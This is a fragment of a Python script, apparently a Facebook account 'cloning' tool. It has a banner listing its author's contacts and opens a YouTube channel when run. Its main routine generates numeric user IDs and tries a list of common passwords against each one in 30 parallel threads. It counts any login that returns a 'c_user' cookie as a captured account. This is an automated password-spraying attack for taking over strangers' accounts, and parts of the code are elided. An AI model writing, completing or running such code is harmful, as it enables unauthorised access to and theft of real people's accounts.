...
╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ 
 ...
 \033[1;32m  ╔════════════════════════════════════╗
 \033[1;32m  ║😈[•] Facebook' : MD Riyadul Momin  
\033[1;32m   ║😈[•] Whatsapp' : +17867244875      
 \033[1;32m  ║😈[•] Github    : https://github.com/Rk-Black/
 \033[1;32m  ║😈[•] Status    : FREE            
  \033[1;32m ║😈[•] Network   : 3G, 4G/5G,WIFI ON       
 \033[1;32m  ║😈[•] Version   : 9.0               
 \033[1;32m  ║😈[•] Tools     : Rk-RANDOM-OK             
 \033[1;32m  ╚════════════════════════════════════╝"""
clear()
os.system("xdg-open https://youtube.com/channel/UCo8W7dLKHTgyN4y26Ly3uOQ")
xxxx = str(len(ugen))
...
def pass4():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'khankhan','mim123','khan123','khan12','khan1122','bangladesh','alihasan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[RIYAD] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
